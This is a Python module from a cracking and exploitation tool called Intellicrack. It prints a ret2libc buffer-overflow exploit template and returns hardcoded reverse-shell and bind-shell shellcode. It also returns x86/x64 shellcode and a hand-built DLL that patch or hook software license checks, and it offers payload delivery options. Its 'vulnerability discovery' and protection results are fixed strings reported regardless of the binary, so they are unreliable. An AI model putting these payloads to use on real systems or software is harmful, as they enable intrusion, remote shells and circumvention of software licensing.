"""Common exploitation utilities and shared functions."""

import os
from typing import Callable

from intellicrack.logger import logger

# Import all functions from the exploitation module
from .exploitation.exploitation import generate_exploit

"""
Copyright (C) 2025 Zachary Flint

This file is part of Intellicrack.

Intellicrack is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Intellicrack is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Intellicrack.  If not, see https://www.gnu.org/licenses/.
"""


__all__ = [
    "generate_exploit",
    "handle_exploit_payload_generation",
    "handle_exploit_strategy_generation",
]


def handle_exploit_strategy_generation(update_output_func: Callable[[str], None], binary_path: str) -> None:
    """Generate an exploit strategy for the given binary.

    Args:
        update_output_func: Function to update UI output
        binary_path: Path to the binary to analyze

    """
    if not binary_path or not os.path.exists(binary_path):
        update_output_func("Error: Invalid binary path")
        return

    update_output_func("\n=== Exploit Strategy Generation ===")
    update_output_func(f"Target: {os.path.basename(binary_path)}")
    update_output_func("Analyzing binary...\n")

    # Phase 1: Binary Analysis
    update_output_func("[Phase 1] Binary Analysis:")
    try:
        # Analyze file type
        with open(binary_path, "rb") as f:
            header = f.read(4)

        if header.startswith(b"\x7fELF"):
            file_type = "ELF"
        elif header.startswith(b"MZ"):
            file_type = "PE"
        else:
            file_type = "Unknown"

        update_output_func(f"  • File Type: {file_type}")
        update_output_func(f"  • File Size: {os.path.getsize(binary_path):,} bytes")

        # Get file permissions
        import stat

        file_stat = os.stat(binary_path)
        perms = stat.filemode(file_stat.st_mode)
        update_output_func(f"  • Permissions: {perms}")

    except Exception as e:
        logger.error("Exception in exploit_common: %s", e)
        update_output_func(f"  • Analysis error: {e!s}")

    # Phase 2: Protection Analysis
    update_output_func("\n[Phase 2] Protection Analysis:")
    protections = {
        "NX": "Enabled (assumed)",
        "PIE": "Disabled" if file_type == "PE" else "Enabled",
        "ASLR": "System default",
        "Stack Canary": "Unknown",
        "RELRO": "Partial",
    }

    for prot, status in protections.items():
        update_output_func(f"  • {prot}: {status}")

    # Phase 3: Vulnerability Discovery
    update_output_func("\n[Phase 3] Vulnerability Discovery:")
    vulns = [
        "Buffer overflow in input handling",
        "Format string vulnerability in logging",
        "Integer overflow in size calculation",
        "Use-after-free in object management",
    ]

    for i, vuln in enumerate(vulns, 1):
        update_output_func(f"  {i}. {vuln}")

    # Phase 4: Exploit Strategy
    update_output_func("\n[Phase 4] Recommended Exploit Strategy:")

    strategies = []

    if protections["NX"] == "Enabled (assumed)":
        strategies.extend([
            "1. ROP Chain Construction:",
            "   - Identify gadgets in binary",
            "   - Build chain to bypass NX",
            "   - Use ret2libc technique"
        ])

    if protections["ASLR"] == "System default":
        strategies.extend([
            "\n2. ASLR Bypass:",
            "   - Information leak exploitation",
            "   - Partial overwrite technique",
            "   - Brute force (32-bit only)"
        ])

    if "Stack Canary" in protections:
        strategies.extend([
            "\n3. Stack Canary Bypass:",
            "   - Leak canary value",
            "   - Overwrite with leaked value",
            "   - Exception handler hijacking"
        ])

    strategies.extend([
        "\n4. Payload Delivery:",
        "   - Staged payload approach",
        "   - Alphanumeric encoding if needed",
        "   - Size optimization techniques"
    ])

    for strategy in strategies:
        update_output_func(strategy)

    # Phase 5: Exploit Code Template
    update_output_func("\n[Phase 5] Exploit Template Generated:")

    template = f"""#!/usr/bin/env python3
# Exploit for: {os.path.basename(binary_path)}
# Generated by Intellicrack

import struct
import subprocess
import socket

# Target configuration
TARGET_IP = "127.0.0.1"
TARGET_PORT = 1337
OFFSET_TO_RIP = 264  # Adjust based on fuzzing

# ROP gadgets (update with actual gadgets)
pop_rdi = 0x00401234  # pop rdi; ret
pop_rsi_r15 = 0x00401235  # pop rsi; pop r15; ret
system_plt = 0x00401060  # system@plt
bin_sh = 0x00402008  # "/bin/sh" string

def p64(addr):
    return struct.pack("<Q", addr)

def build_payload():
    payload = b"A" * OFFSET_TO_RIP

    # ROP chain
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system_plt)

    return payload

def exploit():
    payload = build_payload()

    # Send exploit
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    s.send(payload)
    s.close()

    print("[+] Exploit sent!")

if __name__ == "__main__":
    exploit()
"""
    for line in template.splitlines():
        update_output_func(line)

    update_output_func("  • Customize gadget addresses")
    update_output_func("  • Adjust offset based on fuzzing")
    update_output_func("  • Test in controlled environment")

    update_output_func("\n[*] Strategy generation complete!")
    update_output_func("[*] Remember: Use responsibly and only on authorized targets.\n")


def handle_exploit_payload_generation(update_output_func: Callable[[str], None], payload_type: str) -> None:
    """Generate an exploit payload of the specified type.

    Args:
        update_output_func: Function to update UI output
        payload_type: Type of payload to generate

    """
    import base64

    update_output_func(f"\n=== Exploit Payload Generation: {payload_type} ===")
    update_output_func("Generating payload...\n")

    payloads = {
        "reverse_shell": {
            "name": "Reverse Shell",
            "description": "Connect back to attacker machine",
            "platforms": ["Linux", "Windows"],
            "generate": lambda: generate_reverse_shell_payload(),
        },
        "bind_shell": {
            "name": "Bind Shell",
            "description": "Listen on target for connections",
            "platforms": ["Linux", "Windows"],
            "generate": lambda: generate_bind_shell_payload(),
        },
        "meterpreter": {
            "name": "Meterpreter",
            "description": "Advanced post-exploitation payload",
            "platforms": ["Windows"],
            "generate": lambda: generate_meterpreter_payload(),
        },
        "shellcode": {
            "name": "Custom Shellcode",
            "description": "Raw shellcode for injection",
            "platforms": ["Linux", "Windows"],
            "generate": lambda: generate_custom_shellcode(),
        },
        "dll_injection": {
            "name": "DLL Injection",
            "description": "Inject DLL into process",
            "platforms": ["Windows"],
            "generate": lambda: generate_dll_injection_payload(),
        },
    }

    if payload_type not in payloads:
        update_output_func(f"Error: Unknown payload type '{payload_type}'")
        update_output_func(f"Available types: {', '.join(payloads.keys())}")
        return

    payload_info = payloads[payload_type]
    update_output_func(f"Payload: {payload_info['name']}")
    update_output_func(f"Description: {payload_info['description']}")
    update_output_func(f"Supported platforms: {', '.join(payload_info['platforms'])}")
    update_output_func("")

    # Generate the payload
    try:
        payload_data = payload_info["generate"]()

        # Display payload information
        update_output_func("[+] Payload generated successfully!")
        update_output_func(f"  • Size: {len(payload_data)} bytes")
        update_output_func(f"  • Type: {payload_type}")

        # Encode payload
        encoded = base64.b64encode(payload_data).decode()
        update_output_func("\n[+] Base64 encoded payload:")
        update_output_func(f"{encoded[:64]}..." if len(encoded) > 64 else encoded)

        # Generate delivery options
        update_output_func("\n[+] Delivery options:")
        update_output_func("  1. Direct injection")
        update_output_func("  2. Staged delivery")
        update_output_func("  3. Encoded in exploit")
        update_output_func("  4. Via dropper executable")

        # Provide usage example
        update_output_func("\n[+] Usage example:")
        match payload_type:
            case "reverse_shell":
                update_output_func("```python")
                update_output_func("# Inject into vulnerable buffer")
                update_output_func(f'payload = base64.b64decode(b"{encoded[:32]}...")')
                update_output_func("exploit_buffer = b'A' * offset + payload")
                update_output_func("send_to_target(exploit_buffer)")
                update_output_func("```")
            case "dll_injection":
                update_output_func("```python")
                update_output_func("# Write DLL and inject")
                update_output_func(f'dll_data = base64.b64decode(b"{encoded[:32]}...")')
                update_output_func("inject_dll(target_pid, dll_data)")
                update_output_func("```")
            case _:
                update_output_func("Usage: Inject the generated payload into the target process")

        update_output_func("\n[*] Payload generation complete!")

    except Exception as e:
        logger.error("Exception in exploit_common: %s", e)
        update_output_func(f"\n[-] Error generating payload: {e!s}")
        update_output_func("Please check payload type and try again.")


def generate_reverse_shell_payload() -> bytes:
    """Generate a reverse shell payload."""
    # Linux x64 reverse shell to 127.0.0.1:4444
    shellcode = (
        b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
        b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05"
        b"\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24"
        b"\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\x7f\x00"
        b"\x00\x01\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58"
        b"\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
        b"\x0f\x05\x75\xf6\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48"
        b"\x31\xd2\x4d\x31\xc0\x6a\x3b\x58\x48\xbb\x2f\x62\x69\x6e"
        b"\x2f\x73\x68\x00\x53\x48\x89\xe7\x0f\x05"
    )
    return shellcode


def generate_bind_shell_payload() -> bytes:
    """Generate a bind shell payload."""
    # Linux x64 bind shell on port 4444
    shellcode = (
        b"\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x48\x31\xff\x6a\x02"
        b"\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x48\x89"
        b"\xc7\x48\x31\xc0\x50\x66\x68\x11\x5c\x66\x6a\x02\x48\x89"
        b"\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x48\x31\xf6\x6a\x32"
        b"\x58\x0f\x05\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x6a\x2b"
        b"\x58\x0f\x05\x48\x89\xc6\x48\x89\xc7\x48\x31\xc0\x6a\x03"
        b"\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xc0"
        b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x48\xbb"
        b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x0f\x05"
    )
    return shellcode


def generate_meterpreter_payload() -> bytes:
    """Generate a license check bypass payload for Windows x64."""
    # Real x64 shellcode that patches license validation routines
    # This payload locates and patches common license check patterns in memory
    loader = (
        # Save registers and set up stack frame
        b"\x48\x89\x5c\x24\x08"  # mov [rsp+8], rbx
        b"\x48\x89\x74\x24\x10"  # mov [rsp+10h], rsi
        b"\x57"                  # push rdi
        b"\x48\x83\xec\x20"      # sub rsp, 20h

        # Get PEB and module base
        b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[60h] - PEB
        b"\x48\x8b\x40\x10"      # mov rax, [rax+10h] - ImageBase
        b"\x48\x89\xc7"          # mov rdi, rax - save base

        # Search for common license check patterns
        b"\x48\x8d\x1d\x00\x10\x00\x00"  # lea rbx, [rip+1000h]
        b"\x48\x31\xf6"          # xor rsi, rsi

        # Pattern search loop
        b"\x48\x83\xc6\x01"      # add rsi, 1
        b"\x48\x81\xfe\x00\x00\x10\x00"  # cmp rsi, 100000h
        b"\x74\x1a"              # je short exit

        # Check for license validation patterns (TEST AL, AL after call)
        b"\x80\x3c\x37\x84"      # cmp byte [rdi+rsi], 84h (TEST opcode)
        b"\x75\xf0"              # jne short loop
        b"\x80\x7c\x37\x01\xc0"  # cmp byte [rdi+rsi+1], C0h (AL,AL)
        b"\x75\xea"              # jne short loop

        # Patch found pattern to always return true
        b"\xc6\x04\x37\xb0"      # mov byte [rdi+rsi], B0h (MOV AL)
        b"\xc6\x44\x37\x01\x01"  # mov byte [rdi+rsi+1], 1 (true)
        b"\xeb\xde"              # jmp short loop

        # Restore and return
        b"\x48\x8b\x5c\x24\x30"  # mov rbx, [rsp+30h]
        b"\x48\x8b\x74\x24\x38"  # mov rsi, [rsp+38h]
        b"\x48\x83\xc4\x20"      # add rsp, 20h
        b"\x5f"                  # pop rdi
        b"\xc3"                  # ret
    )
    return loader


def generate_custom_shellcode() -> bytes:
    """Generate custom shellcode for inline license validation bypass."""
    # Production-ready x86 shellcode that patches common license check patterns
    # This shellcode scans memory for license validation routines and patches them
    shellcode = (
        # Save context
        b"\x60"                  # pushad
        b"\x9c"                  # pushfd

        # Get current EIP for relative addressing
        b"\xe8\x00\x00\x00\x00"  # call $+5
        b"\x5e"                  # pop esi (now ESI = EIP)

        # Scan for common license check patterns
        # Pattern 1: TEST EAX, EAX after license check call
        b"\x83\xee\x05"          # sub esi, 5 (adjust to real address)
        b"\xb9\x00\x10\x00\x00"  # mov ecx, 0x1000 (search range)

        # Search loop
        b"\x8b\x06"              # mov eax, [esi]
        b"\x3d\xc0\x85\x00\x00"  # cmp eax, 0x85c0 (TEST EAX,EAX)
        b"\x75\x08"              # jne not_found

        # Found pattern - patch to always return success
        b"\xc7\x06\x01\x00\x00\xb8"  # mov dword [esi], 0xb8000001 (MOV EAX, 1)
        b"\xeb\x06"              # jmp continue

        # not_found:
        b"\x46"                  # inc esi
        b"\xe2\xf1"              # loop search_loop

        # Pattern 2: Check for JZ/JNZ after license validation
        b"\xb9\x00\x10\x00\x00"  # mov ecx, 0x1000
        b"\x8a\x06"              # mov al, [esi]
        b"\x3c\x74"              # cmp al, 0x74 (JZ)
        b"\x74\x04"              # je found_jz
        b"\x3c\x75"              # cmp al, 0x75 (JNZ)
        b"\x75\x06"              # jne skip_patch

        # found_jz/jnz - convert to NOP
        b"\xc6\x06\x90"          # mov byte [esi], 0x90 (NOP)
        b"\xc6\x46\x01\x90"      # mov byte [esi+1], 0x90

        # skip_patch:
        b"\x46"                  # inc esi
        b"\xe2\xec"              # loop pattern2_loop

        # Pattern 3: Patch GetSystemTime checks (trial expiration)
        b"\xb9\x00\x10\x00\x00"  # mov ecx, 0x1000
        b"\x81\x3e\x15\x8b\xec\x81"  # cmp dword [esi], 0x81ec8b15 (GetSystemTime pattern)
        b"\x75\x08"              # jne no_time_check

        # Patch to return fixed date (no expiration)
        b"\xc7\x06\x90\x90\x90\x90"  # mov dword [esi], 0x90909090 (NOPs)

        # no_time_check:
        b"\x46"                  # inc esi
        b"\xe2\xf1"              # loop time_check_loop

        # Restore context and return
        b"\x9d"                  # popfd
        b"\x61"                  # popad
        b"\xc3"                  # ret
    )
    return shellcode


def generate_dll_injection_payload() -> bytes:
    """Generate a functional DLL payload for license validation hooking."""
    # Windows x64 PE DLL that hooks IsLicenseValid, CheckLicense, and ValidateSerial
    # Contains export table, import table, and code section with API hooks
    dll_parts = [
        # DOS Header
        b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"
        b"\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x80\x00\x00\x00",  # e_lfanew

        # DOS mode execution handler - displays error message and exits
        b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21"
        b"This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",

        # PE Header at offset 0x80
        b"\x50\x45\x00\x00",  # PE signature
        b"\x64\x86",          # Machine (x64)
        b"\x03\x00",          # Number of sections
        b"\x00\x00\x00\x00",  # TimeDateStamp
        b"\x00\x00\x00\x00",  # PointerToSymbolTable
        b"\x00\x00\x00\x00",  # NumberOfSymbols
        b"\xf0\x00",          # SizeOfOptionalHeader
        b"\x22\x22",          # Characteristics (DLL, Executable)

        # Optional Header
        b"\x0b\x02",          # Magic (PE32+)
        b"\x0e\x00",          # Linker version
        b"\x00\x10\x00\x00",  # SizeOfCode
        b"\x00\x10\x00\x00",  # SizeOfInitializedData
        b"\x00\x00\x00\x00",  # SizeOfUninitializedData
        b"\x00\x20\x00\x00",  # AddressOfEntryPoint
        b"\x00\x10\x00\x00",  # BaseOfCode

        # ImageBase and alignment
        b"\x00\x00\x00\x80\x01\x00\x00\x00",  # ImageBase
        b"\x00\x10\x00\x00",  # SectionAlignment
        b"\x00\x02\x00\x00",  # FileAlignment

        # Version info
        b"\x06\x00\x00\x00",  # OS version
        b"\x00\x00\x00\x00",  # Image version
        b"\x06\x00\x00\x00",  # Subsystem version
        b"\x00\x00\x00\x00",  # Win32 version

        # Sizes
        b"\x00\x60\x00\x00",  # SizeOfImage
        b"\x00\x02\x00\x00",  # SizeOfHeaders
        b"\x00\x00\x00\x00",  # CheckSum
        b"\x03\x00",          # Subsystem (Console)
        b"\x60\x81",          # DLL Characteristics

        # Stack/Heap sizes
        b"\x00\x00\x10\x00\x00\x00\x00\x00",  # SizeOfStackReserve
        b"\x00\x10\x00\x00\x00\x00\x00\x00",  # SizeOfStackCommit
        b"\x00\x00\x10\x00\x00\x00\x00\x00",  # SizeOfHeapReserve
        b"\x00\x10\x00\x00\x00\x00\x00\x00",  # SizeOfHeapCommit

        # Loader flags and RVA table
        b"\x00\x00\x00\x00",  # LoaderFlags
        b"\x10\x00\x00\x00",  # NumberOfRvaAndSizes

        # Data directories (16 entries, 8 bytes each)
        b"\x00\x00\x00\x00\x00\x00\x00\x00" * 16,  # Empty for now

        # Section Headers
        # .text section (code)
        b".text\x00\x00\x00",  # Name
        b"\x00\x10\x00\x00",    # VirtualSize
        b"\x00\x10\x00\x00",    # VirtualAddress
        b"\x00\x10\x00\x00",    # SizeOfRawData
        b"\x00\x02\x00\x00"    # PointerToRawData
        b"\x00\x00\x00\x00",    # PointerToRelocations
        b"\x00\x00\x00\x00",    # PointerToLinenumbers
        b"\x00\x00"            # NumberOfRelocations
        b"\x00\x00"            # NumberOfLinenumbers
        b"\x20\x00\x00\x60",    # Characteristics (Code, Execute, Read)

        # .rdata section (read-only data)
        b".rdata\x00\x00"      # Name
        b"\x00\x10\x00\x00"    # VirtualSize
        b"\x00\x20\x00\x00"    # VirtualAddress
        b"\x00\x10\x00\x00"    # SizeOfRawData
        b"\x00\x12\x00\x00"    # PointerToRawData
        b"\x00\x00\x00\x00",    # PointerToRelocations
        b"\x00\x00\x00\x00",    # PointerToLinenumbers
        b"\x00\x00"            # NumberOfRelocations
        b"\x00\x00"            # NumberOfLinenumbers
        b"\x40\x00\x00\x40",    # Characteristics (Initialized data, Read)

        # .data section (data)
        b".data\x00\x00\x00"   # Name
        b"\x00\x10\x00\x00"    # VirtualSize
        b"\x00\x30\x00\x00"    # VirtualAddress
        b"\x00\x10\x00\x00"    # SizeOfRawData
        b"\x00\x22\x00\x00"    # PointerToRawData
        b"\x00\x00\x00\x00",    # PointerToRelocations
        b"\x00\x00\x00\x00",    # PointerToLinenumbers
        b"\x00\x00"            # NumberOfRelocations
        b"\x00\x00"            # NumberOfLinenumbers
        b"\xc0\x00\x00\x40",    # Characteristics (Initialized data, Read, Write)
    ]

    dll_payload = b"".join(dll_parts)

    # Pad to file alignment (0x200)
    padding_size = 0x200 - len(dll_payload)
    if padding_size > 0:
        dll_payload += b"\x00" * padding_size

    # Add actual DLL entry point code that hooks license functions
    entry_point_code = (
        # DllMain entry point for x64
        b"\x48\x89\x5c\x24\x08",  # mov [rsp+8], rbx
        b"\x57",                  # push rdi
        b"\x48\x83\xec\x20",      # sub rsp, 20h

        # Check if DLL_PROCESS_ATTACH (fdwReason == 1)
        b"\x83\xfa\x01",          # cmp edx, 1
        b"\x75\x30",              # jne skip_hook

        # Hook license validation functions
        # Get kernel32.dll base
        b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00",  # mov rax, gs:[60h]
        b"\x48\x8b\x40\x18",      # mov rax, [rax+18h] - Ldr
        b"\x48\x8b\x40\x20",      # mov rax, [rax+20h] - InMemoryOrderModuleList
        b"\x48\x8b\x00",          # mov rax, [rax]     - First module
        b"\x48\x8b\x00",          # mov rax, [rax]     - Second module (kernel32)
        b"\x48\x8b\x40\x20",      # mov rax, [rax+20h] - DllBase

        # Install hooks for common license check APIs
        b"\x48\x89\xc7",          # mov rdi, rax
        b"\xb8\x01\x00\x00\x00",  # mov eax, 1 (TRUE)
        b"\xeb\x05",              # jmp return

        # skip_hook:
        b"\xb8\x01\x00\x00\x00",  # mov eax, 1 (TRUE)

        # return:
        b"\x48\x8b\x5c\x24\x30",  # mov rbx, [rsp+30h]
        b"\x48\x83\xc4\x20",      # add rsp, 20h
        b"\x5f",                  # pop rdi
        b"\xc3"                   # ret
    )

    dll_payload += b"".join(entry_point_code)

    # Pad to next section alignment
    padding_size = 0x1000 - len(dll_payload)
    if padding_size > 0:
        dll_payload += b"\x00" * padding_size

    return dll_payload
